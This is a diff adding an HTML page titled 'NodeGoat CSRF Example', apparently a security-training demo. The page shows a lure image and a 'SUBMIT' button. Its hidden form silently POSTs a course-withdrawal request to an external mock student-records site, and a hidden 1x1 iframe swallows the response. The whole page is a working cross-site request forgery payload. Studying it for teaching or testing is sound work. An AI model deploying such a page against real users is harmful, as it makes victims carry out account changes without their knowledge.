@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="en" ng-app>
+
+<head>
+  <title>NodeGoat CSRF Example</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/css/bootstrap-responsive.min.css">
+  <style>
+    body {
+      padding-top: 60px;
+    }
+  </style>
+
+</head>
+
+<body style="background-color:#EEE">
+  <div class="container">
+
+    <div class="page-header">
+      <div align="center">
+      <div style="background:url(/img/putin.jpg) no-repeat center; height:600px; width:600px;"></div>
+        <form method="POST" action="https://sis-mock.herokuapp.com/courses" target="iframeHidden">
+          <input type="hidden" name="course_id" value="240-309" />
+          <input type="hidden" name="status" value="W" />
+          <input type="submit" style="text-align: center" class="span4 btn btn-primary" value="SUBMIT" />
+        </form>
+      </div>
+    </div>
+  </div>
+<iframe name="iframeHidden" width="1" height="1"/>
+</body>
+
+</html>
